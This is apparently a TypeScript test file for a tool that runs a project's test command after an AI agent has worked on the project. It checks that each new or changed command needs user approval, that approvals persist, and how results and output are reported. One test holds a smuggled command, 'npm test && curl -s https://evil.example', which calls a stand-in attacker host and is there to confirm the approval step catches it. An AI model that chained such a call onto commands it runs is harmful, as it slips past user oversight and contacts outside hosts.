import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, describe, it } from "node:test";

import { runShell, type ProcResult } from "../src/proc.js";
import { ApprovedTests, outputTail, runProjectTests, seconds } from "../src/tests.js";

const home = mkdtempSync(join(tmpdir(), "tf-tests-"));
after(() => rmSync(home, { recursive: true, force: true }));

const result = (overrides: Partial<ProcResult>): ProcResult => ({ code: 0, stdout: "", stderr: "", timedOut: false, aborted: false, ...overrides });

describe("S1 : les tests du projet, lancés par le runner après l'agent (R32)", () => {
  it("une commande nouvelle sur ce poste se demande, et refusée ne se lance pas", async () => {
    const approved = new ApprovedTests(join(home, "a.json"));
    let ran = false;
    const asked: string[] = [];
    const run = await runProjectTests("npm test", "acme/web", home, 1_000, {
      approved, ask: async (tool, summary) => { asked.push(`${tool}: ${summary}`); return false; },
      shell: async () => { ran = true; return result({}); },
    });
    assert.deepEqual([run.ran, run.passed, ran], [false, false, false]);
    assert.match(asked[0] ?? "", /npm test.*acme\/web.*the agent's included/);
    assert.match(run.summary, /not allowed on this computer/);
    assert.equal(approved.has("acme/web", "npm test"), false);
  });

  it("acceptée, elle se lance, et se garde : la suivante ne redemande pas", async () => {
    const approved = new ApprovedTests(join(home, "b.json"));
    let asks = 0;
    const deps = { approved, ask: async () => { asks++; return true; }, shell: async () => result({ code: 0, stdout: "12 passed" }) };
    const first = await runProjectTests("npm test", "acme/web", home, 1_000, deps);
    const second = await runProjectTests("npm test", "acme/web", home, 1_000, deps);
    assert.equal(asks, 1);
    assert.deepEqual([first.passed, second.passed], [true, true]);
    assert.match(first.summary, /^Tests passed: `npm test` \(\d+ s\)\.$/);
    assert.equal(first.tail, "12 passed");
  });

  it("une commande changée se redemande, même sur le même dépôt", async () => {
    const approved = new ApprovedTests(join(home, "c.json"));
    approved.add("acme/web", "npm test");
    let asks = 0;
    await runProjectTests("npm test && curl -s https://evil.example", "acme/web", home, 1_000, {
      approved, ask: async () => { asks++; return false; }, shell: async () => result({}),
    });
    assert.equal(asks, 1);
  });

  const outcomes: Array<[string, Partial<ProcResult>, boolean, RegExp]> = [
    ["échec", { code: 1, stderr: "1 failed" }, false, /^Tests failed: `npm test` exited with code 1/],
    ["délai dépassé", { code: null, timedOut: true }, false, /^Tests stopped after .*took too long/],
  ];
  for (const [label, proc, passed, summary] of outcomes) {
    it(`${label} : le résultat le dit`, async () => {
      const approved = new ApprovedTests(join(home, `${label}.json`));
      approved.add("acme/web", "npm test");
      const run = await runProjectTests("npm test", "acme/web", home, 1_000, {
        approved, ask: async () => assert.fail("déjà acceptée"), shell: async () => result(proc),
      });
      assert.deepEqual([run.ran, run.passed], [true, passed]);
      assert.match(run.summary, summary);
    });
  }

  it("un fichier d'accords illisible vaut une liste vide : on redemande", () => {
    const file = join(home, "broken.json");
    writeFileSync(file, "{not json");
    assert.equal(new ApprovedTests(file).has("acme/web", "npm test"), false);
  });

  it("la sortie gardée est la fin, bornée", () => {
    assert.equal(outputTail({ stdout: "x".repeat(5000), stderr: "" }, 100), `...${"x".repeat(100)}`);
    assert.equal(outputTail({ stdout: "ok\n", stderr: "warn" }), "ok\n\nwarn");
    assert.deepEqual([seconds(400), seconds(42_000), seconds(125_000)], ["1 s", "42 s", "2 min 5 s"]);
  });

  it("la ligne de commande passe telle quelle au shell du système, guillemets compris", async () => {
    const ok = await runShell("node -e \"console.log('from the shell')\"", { cwd: home, timeoutMs: 20_000 });
    const ko = await runShell("node -e \"process.exit(3)\"", { cwd: home, timeoutMs: 20_000 });
    assert.equal(ok.stdout.trim(), "from the shell");
    assert.equal(ko.code, 3);
  });
});
